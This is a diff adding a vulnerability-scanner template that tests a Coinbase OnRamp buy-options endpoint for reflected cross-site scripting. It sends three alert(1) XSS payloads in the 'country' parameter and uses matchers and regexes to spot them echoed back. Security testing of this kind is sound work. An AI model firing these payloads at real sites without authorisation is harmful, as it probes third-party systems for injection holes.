@@ -1,0 +1,35 @@
+id: custom-xss-coinbase-onramp-buy-options
+info:
+  name: Coinbase OnRamp Buy Options XSS Check
+  author: whitehat-ai
+  severity: medium
+  description: Tests for cross-site scripting vulnerabilities in Coinbase's OnRamp buy options endpoint through country parameter injection
+  tags: xss,cross-site-scripting,coinbase,onramp
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/onramp/v1/buy/options?country=<script>alert(1)</script>"
+      - "{{BaseURL}}/onramp/v1/buy/options?country=\"><img/src=x onerror=alert(1)>"
+      - "{{BaseURL}}/onramp/v1/buy/options?country='\"-alert(1)-'\""
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "alert(1)"
+          - "script>alert"
+          - "img/src=x onerror=alert"
+      - type: regex
+        regex:
+          - "<script.*?alert.*?</script>"
+          - "<img[^>]*onerror\\s*=\\s*[\"']alert.*?[\"'][^>]*>"
+          - "'-alert\\([^)]*\\)-'"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: xss_evidence
+        regex:
+          - "<script[^>]*>(.*?)</script>"
+          - "onerror\\s*=\\s*[\"'].*?alert.*?[\"']"
+          - "'-alert\\([^)]*\\)-'"
